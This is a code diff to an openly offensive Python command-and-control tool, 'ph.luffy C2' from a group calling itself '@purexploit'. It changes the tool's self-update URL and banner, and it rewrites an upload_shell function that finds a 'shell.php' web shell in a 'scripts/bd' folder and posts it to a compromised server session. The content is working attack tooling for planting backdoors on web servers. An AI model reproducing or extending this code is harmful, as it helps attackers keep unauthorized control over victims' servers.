@@ -13,7 +13,7 @@ TOOL_NAME = "ph.luffy C2"
 TOOL_VERSION = "1.0"
 TOOL_AUTHOR = "Coded by ph.luffy"
 
-GITHUB_RAW_URL = "https://raw.githubusercontent.com/kaitolegion/c2/main/c2.py"
+GITHUB_RAW_URL = "https://raw.githubusercontent.com/kaitolegion/c2/main/assets/c2.py"
 
 def check_for_update():
     try:
@@ -66,11 +66,13 @@ def banner():
                          |||             |______________|
                          |||             || ||      || ||
                          |||             || ||      || ||
- ------------------------|||-------------||-||------||-||
+                   ------|||-------------||-||------||-||
                          |__>            || ||      || ||{RESET}
 
-{YELLOW}
-      ph.luffy : select a session to continue
+
+      {GREEN}C2{RESET} : version {YELLOW}1.0{RESET}
+      Team: @purexploit
+      Coded by @ph.luffy
 {RESET}
     """)
     print(SILVER + "-" * 40 + RESET)
@@ -135,20 +137,31 @@ def about_tool():
     print(BLUE + "=" * 40 + RESET)
 
 def upload_shell(session, shell_name="shell.php"):
-    server = session.get("server")
-    shell_path = os.path.join(os.getcwd(), shell_name)
-    if not os.path.exists(shell_path):
-        print(f"{YELLOW}[!]{RESET} {shell_name} not found in current directory")
+    # Try scripts/bd/ first, then current directory
+    possible_paths = [
+        os.path.join(os.getcwd(), "scripts", "bd", shell_name),
+        os.path.join(os.getcwd(), shell_name)
+    ]
+    shell_path = None
+    for path in possible_paths:
+        if os.path.exists(path):
+            shell_path = path
+            break
+
+    if not shell_path:
+        print(f"{YELLOW}[!]{RESET} {shell_name} not found in scripts/bd/ or current directory")
         return
-    
-    files = {'file': open(shell_path, 'rb')}
+
+    server = session.get("server")
     try:
-        r = requests.post(server, params={"action": "upload", "name": shell_name}, files=files)
-        resp = r.json()
-        if resp.get("status") == "uploaded":
-            print(f"{GREEN}[+]{RESET} Uploaded {shell_name} to server as {BLUE}{resp.get('file')}{RESET}")
-        else:
-            print(f"{YELLOW}[!]{RESET} Upload failed")
+        with open(shell_path, 'rb') as f:
+            files = {'file': f}
+            r = requests.post(server, params={"action": "upload", "name": shell_name}, files=files)
+            resp = r.json()
+            if resp.get("status") == "uploaded":
+                print(f"{GREEN}[+]{RESET} Uploaded {shell_name} to server as {BLUE}{resp.get('file')}{RESET}")
+            else:
+                print(f"{YELLOW}[!]{RESET} Upload failed: {resp.get('error', 'Unknown error')}")
     except Exception as e:
         print(f"{YELLOW}[!]{RESET} Upload error: {e}")
 
